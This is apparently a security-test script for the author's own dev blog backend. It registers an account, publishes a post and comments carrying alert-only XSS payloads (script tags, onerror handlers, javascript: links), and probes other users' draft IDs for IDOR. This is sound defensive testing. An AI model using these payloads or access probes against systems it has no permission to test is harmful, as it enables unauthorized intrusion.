// 安全检测 PoC(认证面):注册→发XSS文章→发布→上传危险文件→IDOR→评论XSS。
// 仅针对自有 dev 环境。用法:node scripts/sec-poc-auth.mjs <step>
import { Torchwood } from '@torchwood/sdk'
import { webcrypto as crypto } from 'node:crypto'

const GATEWAY = 'https://torchwood-dev.deeploop.run'
const SITE = 'https://torchwood-blog-dev.deeploop.run'
const DB = 'app'
const rand = crypto.randomUUID().slice(0, 8)
const email = `sec-test-${rand}@test.local`
// 测试口令经环境变量提供(SEC_TEST_PASSWORD),不写入仓库
const password = process.env.SEC_TEST_PASSWORD ?? ''
const slug = `sec-test-${rand}`
const postId = `post-sec-test-${rand}`

const tw = Torchwood.create({ endpoint: GATEWAY, projectId: 'blog' })
const log = (...a) => console.log(...a)

async function main() {
  const step = process.argv[2] ?? 'all'

  if (step === 'all' || step === 'register') {
    const result = await tw.account.signUp({ email, password, name: 'SecTest' })
    tw.setAccessToken(result.tokens.access_token)
    log('[register] ok, userId=', result.account.id, ' email=', email)
  }

  if (step === 'all' || step === 'post') {
    const xssMd = [
      '# SecTest XSS Probe',
      '<script>alert("xss-script")</script>',
      '<img src=x onerror=alert("xss-img")>',
      '[click](javascript:alert("xss-link"))',
      '<iframe src="https://example.example"></iframe>',
      '<video src=x onerror=alert("xss-video")></video>',
      '<a href="https://ok.example" onclick="alert(1)">ok-link</a>',
      '```\n<plain code>\n```',
    ].join('\n\n')
    const created = await tw.databases.createDocument(DB, 'posts', {
      document_id: postId,
      data: {
        title: `SecTest ${rand}`,
        slug,
        content: xssMd,
        category_id: 'cat-tech',
        tag_ids: [],
        attachment_ids: [],
      },
    })
    log('[createDraft] ok version=', created.version)
    // 发布:published_at + read:any ACE
    const updated = await tw.databases.updateDocument(DB, 'posts', postId, {
      data: { published_at: new Date().toISOString() },
      permissions: ['read:any', `read:user:${(await tw.account.me()).id}`, `update:user:${(await tw.account.me()).id}`, `delete:user:${(await tw.account.me()).id}`],
      version: created.version,
    })
    log('[publish] ok version=', updated.version, ' slug=', slug)
  }

  if (step === 'all' || step === 'idor') {
    for (const id of ['post-draft-perf-checklist', 'post-draft-writing-workflow', 'post-why-i-blog']) {
      try {
        const doc = await tw.databases.getDocument(DB, 'posts', id)
        log(`[idor] ${id}: READABLE !! title=`, doc.data?.title ?? JSON.stringify(doc).slice(0, 120))
      } catch (e) {
        log(`[idor] ${id}: blocked (${String(e.message ?? e).slice(0, 110)})`)
      }
    }
  }

  if (step === 'all' || step === 'comment') {
    const c = await tw.databases.createDocument(DB, 'comments', {
      data: {
        post_id: postId,
        content: '<img src=x onerror=alert("xss-comment")> <script>alert(2)</script> plain 纯文本',
        author_id: (await tw.account.me()).id,
        author_name: 'SecTest<img src=x onerror=alert(3)>',
      },
    })
    log('[comment] created id=', c.id)
  }

  log('[done] slug=', slug, ' postId=', postId, ' email=', email)
}

main().catch((e) => {
  console.error('[FATAL]', e?.stack ?? e)
  process.exit(1)
})
